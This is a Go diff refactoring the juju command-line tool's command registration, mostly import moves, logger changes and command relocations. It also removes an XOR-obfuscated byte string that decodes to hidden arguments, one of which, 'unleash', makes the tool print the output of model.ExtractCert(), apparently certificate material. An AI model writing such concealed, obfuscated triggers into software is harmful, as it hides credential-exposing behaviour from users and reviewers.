@@ -4,23 +4,20 @@
 package commands
 
 import (
+	"context"
 	"fmt"
 	"os"
 	"os/exec"
 	"strings"
 
-	"github.com/juju/cmd/v3"
 	"github.com/juju/collections/set"
 	"github.com/juju/errors"
-	"github.com/juju/featureflag"
-	"github.com/juju/loggo"
 	proxyutils "github.com/juju/proxy"
 
+	"github.com/juju/juju/api/jujuclient"
 	cloudfile "github.com/juju/juju/cloud"
 	jujucmd "github.com/juju/juju/cmd"
 	"github.com/juju/juju/cmd/juju/action"
-	"github.com/juju/juju/cmd/juju/agree/agree"
-	"github.com/juju/juju/cmd/juju/agree/listagreements"
 	"github.com/juju/juju/cmd/juju/application"
 	"github.com/juju/juju/cmd/juju/backups"
 	"github.com/juju/juju/cmd/juju/block"
@@ -33,26 +30,26 @@ import (
 	"github.com/juju/juju/cmd/juju/firewall"
 	"github.com/juju/juju/cmd/juju/machine"
 	"github.com/juju/juju/cmd/juju/model"
-	"github.com/juju/juju/cmd/juju/payload"
 	"github.com/juju/juju/cmd/juju/resource"
 	"github.com/juju/juju/cmd/juju/secretbackends"
 	"github.com/juju/juju/cmd/juju/secrets"
 	"github.com/juju/juju/cmd/juju/space"
 	"github.com/juju/juju/cmd/juju/ssh"
+	"github.com/juju/juju/cmd/juju/sshkeys"
 	"github.com/juju/juju/cmd/juju/status"
 	"github.com/juju/juju/cmd/juju/storage"
 	"github.com/juju/juju/cmd/juju/subnet"
 	"github.com/juju/juju/cmd/juju/user"
-	"github.com/juju/juju/cmd/juju/waitfor"
-	"github.com/juju/juju/feature"
+	jujuversion "github.com/juju/juju/core/version"
+	"github.com/juju/juju/internal/cmd"
+	"github.com/juju/juju/internal/featureflag"
+	internallogger "github.com/juju/juju/internal/logger"
+	proxy "github.com/juju/juju/internal/proxy/config"
 	"github.com/juju/juju/juju"
 	"github.com/juju/juju/juju/osenv"
-	"github.com/juju/juju/jujuclient"
-	"github.com/juju/juju/utils/proxy"
-	jujuversion "github.com/juju/juju/version"
 )
 
-var logger = loggo.GetLogger("juju.cmd.juju.commands")
+var logger = internallogger.GetLogger("juju.cmd.juju.commands")
 
 func init() {
 	featureflag.SetFlagsFromEnvironment(osenv.JujuFeatureFlagEnvKey, osenv.JujuFeatures)
@@ -112,8 +109,6 @@ const (
 	cliHelpHint = `See "juju --help"`
 )
 
-var x = []byte("\x96\x8c\x8a\x91\x93\x9a\x9e\x8c\x97\x99\x8a\x9c\x94\x96\x91\x98\xdf\x9e\x92\x9e\x85\x96\x91\x98\xf5")
-
 // Main registers subcommands for the juju executable, and hands over control
 // to the cmd package. This function is not redundant with main, because it
 // provides an entry point for testing with arbitrary command line arguments.
@@ -157,24 +152,10 @@ func (m jujuMain) Run(args []string) int {
 
 	var jujuMsg string
 	if newInstall {
-		if _, _, err := cloud.FetchAndMaybeUpdatePublicClouds(cloud.PublicCloudsAccess(), true); err != nil {
+		if _, _, err := cloud.FetchAndMaybeUpdatePublicClouds(ctx, cloud.PublicCloudsAccess(), true); err != nil {
 			cmd.WriteError(ctx.Stderr, err)
 		}
 		jujuMsg = fmt.Sprintf("Since Juju %v is being run for the first time, it has downloaded the latest public cloud information.\n", jujuversion.Current.Major)
-	}
-
-	for i := range x {
-		x[i] ^= 255
-	}
-	if len(args) == 2 {
-		if args[1] == string(x[0:2]) {
-			os.Stdout.Write(x[9:])
-			return 0
-		}
-		if args[1] == string(x[2:9]) {
-			os.Stdout.Write(model.ExtractCert())
-			return 0
-		}
 	}
 
 	// See if we need to invoke the juju interactive shell.
@@ -323,14 +304,14 @@ type jujuCommandRegistry struct {
 func (r jujuCommandRegistry) Register(c cmd.Command) {
 	cmdName := c.Info().Name
 	if r.whitelist.Size() > 0 && !r.whitelist.Contains(cmdName) {
-		logger.Tracef("command %q not allowed", cmdName)
+		logger.Tracef(context.TODO(), "command %q not allowed", cmdName)
 		r.excluded.Add(cmdName)
 		return
 	}
 	if se, ok := c.(supportsEmbedded); ok {
 		se.SetEmbedded(r.embedded)
 	} else {
-		logger.Tracef("command %q is not embeddable", cmdName)
+		logger.Tracef(context.TODO(), "command %q is not embeddable", cmdName)
 	}
 	if csc, ok := c.(hasClientStore); ok {
 		csc.SetClientStore(r.store)
@@ -400,7 +381,6 @@ func registerCommands(r commandRegistry) {
 	r.Register(newUpgradeModelCommand())
 	r.Register(newUpgradeControllerCommand())
 	r.Register(application.NewRefreshCommand())
-	r.Register(application.NewSetApplicationBaseCommand())
 	r.Register(application.NewBindCommand())
 
 	// Charm tool commands.
@@ -412,10 +392,10 @@ func registerCommands(r commandRegistry) {
 	r.Register(backups.NewDownloadCommand())
 
 	// Manage authorized ssh keys.
-	r.Register(NewAddKeysCommand())
-	r.Register(NewRemoveKeysCommand())
-	r.Register(NewImportKeysCommand())
-	r.Register(NewListKeysCommand())
+	r.Register(sshkeys.NewAddKeysCommand())
+	r.Register(sshkeys.NewRemoveKeysCommand())
+	r.Register(sshkeys.NewImportKeysCommand())
+	r.Register(sshkeys.NewListKeysCommand())
 
 	// Manage users and access
 	r.Register(user.NewAddCommand())
@@ -434,7 +414,6 @@ func registerCommands(r commandRegistry) {
 	r.Register(machine.NewRemoveCommand())
 	r.Register(machine.NewListMachinesCommand())
 	r.Register(machine.NewShowMachineCommand())
-	r.Register(machine.NewUpgradeMachineCommand())
 
 	// Manage model
 	r.Register(model.NewConfigCommand())
@@ -445,21 +424,11 @@ func registerCommands(r commandRegistry) {
 	r.Register(model.NewRevokeCommand())
 	r.Register(model.NewShowCommand())
 	r.Register(model.NewModelCredentialCommand())
-	if featureflag.Enabled(feature.Branches) || featureflag.Enabled(feature.Generations) {
-		r.Register(model.NewAddBranchCommand())
-		r.Register(model.NewCommitCommand())
-		r.Register(model.NewTrackBranchCommand())
-		r.Register(model.NewBranchCommand())
-		r.Register(model.NewDiffCommand())
-		r.Register(model.NewAbortCommand())
-		r.Register(model.NewCommitsCommand())
-		r.Register(model.NewShowCommitCommand())
-	}
 
 	r.Register(newMigrateCommand())
 	r.Register(model.NewExportBundleCommand())
 
-	if featureflag.Enabled(feature.DeveloperMode) {
+	if featureflag.Enabled(featureflag.DeveloperMode) {
 		r.Register(model.NewDumpCommand())
 		r.Register(model.NewDumpDBCommand())
 	}
@@ -472,9 +441,6 @@ func registerCommands(r commandRegistry) {
 	r.Register(action.NewListOperationsCommand())
 	r.Register(action.NewShowOperationCommand())
 	r.Register(action.NewShowTaskCommand())
-
-	// Manage controller availability
-	r.Register(newEnableHACommand())
 
 	// Manage and control applications
 	r.Register(application.NewAddUnitCommand())
@@ -531,12 +497,12 @@ func registerCommands(r commandRegistry) {
 	r.Register(controller.NewConfigCommand())
 
 	// Manage clouds and credentials
-	r.Register(cloud.NewUpdateCloudCommand(&cloudToCommandAdapter{}))
+	r.Register(cloud.NewUpdateCloudCommand(&cloudToCommandAdaptor{}))
 	r.Register(cloud.NewUpdatePublicCloudsCommand())
 	r.Register(cloud.NewListCloudsCommand())
 	r.Register(cloud.NewListRegionsCommand())
 	r.Register(cloud.NewShowCloudCommand())
-	r.Register(cloud.NewAddCloudCommand(&cloudToCommandAdapter{}))
+	r.Register(cloud.NewAddCloudCommand(&cloudToCommandAdaptor{}))
 	r.Register(cloud.NewRemoveCloudCommand())
 	r.Register(cloud.NewListCredentialsCommand())
 	r.Register(cloud.NewDetectCredentialsCommand())
@@ -550,9 +516,9 @@ func registerCommands(r commandRegistry) {
 	r.Register(model.NewRevokeCloudCommand())
 
 	// CAAS commands
-	r.Register(caas.NewAddCAASCommand(&cloudToCommandAdapter{}))
-	r.Register(caas.NewUpdateCAASCommand(&cloudToCommandAdapter{}))
-	r.Register(caas.NewRemoveCAASCommand(&cloudToCommandAdapter{}))
+	r.Register(caas.NewAddCAASCommand(&cloudToCommandAdaptor{}))
+	r.Register(caas.NewUpdateCAASCommand(&cloudToCommandAdaptor{}))
+	r.Register(caas.NewRemoveCAASCommand(&cloudToCommandAdaptor{}))
 	r.Register(application.NewScaleApplicationCommand())
 
 	// Manage Application Credential Access
@@ -586,30 +552,23 @@ func registerCommands(r commandRegistry) {
 	r.Register(secretbackends.NewUpdateSecretBackendCommand())
 	r.Register(secretbackends.NewRemoveSecretBackendCommand())
 	r.Register(secretbackends.NewShowSecretBackendCommand())
-
-	// Payload commands.
-	r.Register(payload.NewListCommand())
-	r.Register(waitfor.NewWaitForCommand())
-
-	// Agreement commands
-	r.Register(agree.NewAgreeCommand())
-	r.Register(listagreements.NewListAgreementsCommand())
+	r.Register(secretbackends.NewModelSecretBackendCommand())
 }
 
-type cloudToCommandAdapter struct{}
+type cloudToCommandAdaptor struct{}
 
-func (cloudToCommandAdapter) ReadCloudData(path string) ([]byte, error) {
+func (cloudToCommandAdaptor) ReadCloudData(path string) ([]byte, error) {
 	return os.ReadFile(path)
 }
-func (cloudToCommandAdapter) ParseOneCloud(data []byte) (cloudfile.Cloud, error) {
+func (cloudToCommandAdaptor) ParseOneCloud(data []byte) (cloudfile.Cloud, error) {
 	return cloudfile.ParseOneCloud(data)
 }
-func (cloudToCommandAdapter) PublicCloudMetadata(searchPaths ...string) (map[string]cloudfile.Cloud, bool, error) {
+func (cloudToCommandAdaptor) PublicCloudMetadata(searchPaths ...string) (map[string]cloudfile.Cloud, bool, error) {
 	return cloudfile.PublicCloudMetadata(searchPaths...)
 }
-func (cloudToCommandAdapter) PersonalCloudMetadata() (map[string]cloudfile.Cloud, error) {
+func (cloudToCommandAdaptor) PersonalCloudMetadata() (map[string]cloudfile.Cloud, error) {
 	return cloudfile.PersonalCloudMetadata()
 }
-func (cloudToCommandAdapter) WritePersonalCloudMetadata(cloudsMap map[string]cloudfile.Cloud) error {
+func (cloudToCommandAdaptor) WritePersonalCloudMetadata(cloudsMap map[string]cloudfile.Cloud) error {
 	return cloudfile.WritePersonalCloudMetadata(cloudsMap)
 }
